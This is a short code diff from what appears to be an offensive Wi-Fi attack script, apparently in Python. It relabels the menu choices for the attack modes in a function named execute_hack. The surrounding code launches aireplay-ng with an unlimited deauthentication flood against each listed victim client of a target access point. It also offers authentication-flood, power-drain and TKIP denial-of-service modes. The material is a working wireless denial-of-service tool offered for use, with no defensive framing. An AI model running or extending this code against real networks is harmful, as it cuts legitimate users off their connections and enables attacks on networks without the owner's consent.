@@ -275,8 +275,8 @@ def execute_hack(info, victims):
 
     # CHECK VICTIMS
     if victims:
-        user_input = input("Enter A for AUTH DoS, D for DISASSOC DoS, P for POWER DRAIN, T for TKIP DoS: ").strip()
-        if user_input.lower() == "d": # Disassociation DoS
+        user_input = input("Enter A for AUTH DoS, D for DEAUTH DoS, P for POWER DRAIN, T for TKIP DoS: ").strip()
+        if user_input.lower() == "d": # Deauth DoS
             for vic in victims:
                 subprocess.call(["x-terminal-emulator","-e","sudo", "aireplay-ng", "-0", "0", "-a", info.bssid, "-c", vic, "-e", info.ssid, info.mon_interface])
         elif user_input.lower() == "p": # Power Drain
